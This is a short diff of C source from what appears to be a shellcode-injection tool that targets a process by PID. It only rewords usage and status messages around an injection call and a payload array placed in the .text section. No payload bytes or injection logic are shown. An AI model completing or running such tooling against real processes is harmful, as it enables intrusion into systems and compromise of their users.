@@ -18,7 +18,7 @@ __declspec(allocate(".text")) CONST UCHAR Payload[] = {
 int main(int argc, char* argv[]){
 
     if (argc < 2) {
-        WARN("usage: \"%s\" PID", argv[0]);
+        WARN("usage: \"%s\" [PID]", argv[0]);
         return EXIT_FAILURE;
     }
 
@@ -27,11 +27,11 @@ int main(int argc, char* argv[]){
                 Payload, 
                 sizeof(Payload)
     )) {
-        WARN("injection failed, exiting...");
+        WARN("shellcode injection failed, exiting...");
         return EXIT_FAILURE;
     }
 
-    OKAY("injection was successful! exiting...");
+    OKAY("shellcode injection was successful! exiting...");
     return EXIT_SUCCESS;
 
 }
